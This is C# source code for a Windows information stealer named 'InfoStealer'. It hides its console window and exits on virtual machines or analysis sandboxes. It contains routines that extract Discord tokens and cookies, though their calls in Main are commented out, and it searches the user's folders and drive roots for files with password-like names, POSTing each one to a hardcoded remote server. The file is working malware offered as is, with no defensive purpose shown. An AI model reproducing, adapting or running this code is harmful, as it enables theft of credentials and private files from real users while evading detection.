using System;
using System.IO;
using System.Net;
using System.Text;
using System.Management;
using System.Security.Principal;
using System.Runtime.InteropServices;

namespace InfoStealer
{
	internal class Program
	{
		// Setup Hidden window
		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		const int SW_HIDE = 0;
		const int SW_SHOW = 5;

		struct s_data<T>
		{
			public T file_data { get; set; }
			public string file_type = "File type undefined";
		}

		static s_data<string> fill_data()
		{
			s_data<string> data = new s_data<string>();
			data.file_type = "[DEFAULT] File Type";
			data.file_data = "[DEFAULT] FILE DATA " + DateTime.Now + "\n\n";
			return data;


		}

		static void send_data(s_data<string> data, string server)
		{
			WebRequest request = WebRequest.Create(server);
			request.Method = "POST";
			request.ContentType = "[STRING]" + string.Join("", Encoding.ASCII.GetChars(Encoding.ASCII.GetBytes(data.file_type.ToCharArray())));  // Filter out non ASCII charakters
			byte[] byteArray = Encoding.UTF8.GetBytes(data.file_data + "\n");														// Add trailing newline to string
			request.ContentLength = byteArray.Length;
			Stream dataStream = request.GetRequestStream();
			dataStream.Write(byteArray, 0, byteArray.Length);
			request.Timeout = 1000;
			dataStream.Close();
			try { request.GetResponse(); } catch { }
		}

		static void send_data(s_data<byte[]> data, string server)
		{
			WebRequest request = WebRequest.Create(server);
			request.Method = "POST";
			request.ContentType = "[BYTES]" + string.Join("", Encoding.ASCII.GetChars(Encoding.ASCII.GetBytes(data.file_type.ToCharArray())));	// Filter out non ASCII charakters
			request.ContentLength = data.file_data.Length;
			Stream dataStream = request.GetRequestStream();
			dataStream.Write(data.file_data, 0, data.file_data.Length);
			request.Timeout = 200;
			dataStream.Close();
			try { request.GetResponse(); } catch { }
		}

		static bool is_VM()
		{

			// Check Manufacturer Strings
			try
			{
				var man_searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
				var man_items = man_searcher.Get();
				foreach (var man_item in man_items)
				{
					string manufacturer = man_item["Manufacturer"].ToString().ToLower();
					if ((manufacturer == "microsoft corporation" && man_item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
						|| manufacturer.Contains("vmware")
						|| man_item["Model"].ToString() == "VirtualBox")
					{
						return true;
					}
				}
			}
			catch { }

			try
			{
				string PC_Name = Environment.MachineName.ToUpperInvariant();
				if (PC_Name.Contains("VM") || PC_Name.Contains("VIRTUAL") || PC_Name.Contains("DEFEND")) return true;       // Check machine name strings
			}
			catch { }

			try
			{
				string User_Name = Environment.UserName.ToUpperInvariant();
				if (User_Name.Contains("VM") || User_Name.Contains("VIRTUAL") || User_Name.Contains("DEFEND")) return true;     // Check Username strings
			}
			catch { }

			try
			{
				if (Environment.ProcessorCount <= 2) return true;                                                               // If less than 2 Processor cores
				if (Environment.TickCount <= 1000) return true;                                                                 // Time since computer started
			}
			catch { }

			// !TODO: Check total system memory

			return false;
		}

		static bool is_admin()
		{
			var id = WindowsIdentity.GetCurrent();
			return id.Owner != id.User;
		}

		static s_data<string> discord_token()
		{
			int offset = 0;
			string token = "";
			string token_file_string;
			s_data<string> exfil_data = new s_data<string>();
			exfil_data.file_type = "Discord Email::Token";
			// get list of every file in %appdata%\discord\...
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\");
			foreach (string file in files)
			{
				if (File.ReadAllText(file).Contains("token"))
				{
					string[] token_file_arr = File.ReadAllText(file).Split("token");
					try { token_file_string = token_file_arr[3]; } catch { token_file_string = token_file_arr[2]; }
					while (token_file_string[offset] != '\"') offset++;       // reach first "
					offset++;
					while (token_file_string[offset] != '\"')
					{
						token += token_file_string[offset];
						offset++;
					}
					token += "\n\n";
					break;
				}
			}
			exfil_data.file_data = token;
			return exfil_data;
		}

		static s_data<byte[]> discord_cookies()
		{
			s_data<byte[]> exfil_data = new s_data<byte[]>();
			exfil_data.file_type = "Discord Cookies";
			exfil_data.file_data = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Cookies");
			return exfil_data;
		}

		static void send_pwd_files(bool admin, string target_IP)
		{
			s_data<byte[]> exfil_data = new s_data<byte[]>();

			// If admin search all data in user folder
			if (admin)
			{
				foreach (string file in Directory.EnumerateFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "*.*", SearchOption.AllDirectories))
				{
					if (file.ToUpper().Contains("PASS") || file.ToUpper().Contains("PWD") || file.ToUpper().Contains("DATEN") || file.ToUpper().Contains("DATA"))
					{
						if (!file.ToUpper().Contains("\\DATA\\"))
						{
							exfil_data.file_type = "[PASSWORD FILE]" + file;
							try { exfil_data.file_data = File.ReadAllBytes(file); } catch { }
							send_data(exfil_data, target_IP);
						}
					}
				}
			}

			// Only search "open" Folders
			else
			{
				// User Root folder
				foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)))
				{
					if (file.ToUpper().Contains("PASS") || file.ToUpper().Contains("PWD") || file.ToUpper().Contains("DATEN") || file.ToUpper().Contains("DATA"))
					{
						exfil_data.file_type = "[PASSWORD FILE]" + file;
						try { exfil_data.file_data = File.ReadAllBytes(file); } catch { }
						send_data(exfil_data, target_IP);
					}
				}
				// Desktop and subfolders
				foreach (string file in Directory.EnumerateFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories))
				{
					if (file.ToUpper().Contains("PASS") || file.ToUpper().Contains("PWD") || file.ToUpper().Contains("DATEN") || file.ToUpper().Contains("DATA"))
					{
						exfil_data.file_type = "[PASSWORD FILE]" + file;
						try { exfil_data.file_data = File.ReadAllBytes(file); } catch { }
						send_data(exfil_data, target_IP);
					}
				}
				// User Documents folder
				foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)))
				{
					if (file.ToUpper().Contains("PASS") || file.ToUpper().Contains("PWD") || file.ToUpper().Contains("DATEN") || file.ToUpper().Contains("DATA"))
					{
						exfil_data.file_type = "[PASSWORD FILE]" + file;
						exfil_data.file_data = File.ReadAllBytes(file);
						send_data(exfil_data, target_IP);
					}
				}

				foreach (DriveInfo drive in DriveInfo.GetDrives())
				{
					foreach (string file in Directory.EnumerateFiles(drive.ToString()))
                    {
						if (file.ToUpper().Contains("PASS") || file.ToUpper().Contains("PWD") || file.ToUpper().Contains("DATEN") || file.ToUpper().Contains("DATA"))
						{
							exfil_data.file_type = "[PASSWORD FILE]" + file;
							exfil_data.file_data = File.ReadAllBytes(file);
							send_data(exfil_data, target_IP);
						}
                    }
				}
			}
		}

		static void admin_handler(string target_IP)
		{

		}

		public static int Main(string[] args)
		{
			if (is_VM()) return 255;
			// Hide Window
			var handle = GetConsoleWindow();
			ShowWindow(handle, SW_HIDE);
			string target_IP = "http://192.168.178.112:8000";

			if (is_admin()) admin_handler(target_IP);

			//try { send_data(discord_token(), target_IP); } catch { }
			//try { send_data(discord_cookies(), target_IP); } catch { }
			try { send_pwd_files(is_admin(), target_IP); } catch { }

			return 0;
		}
	}
}
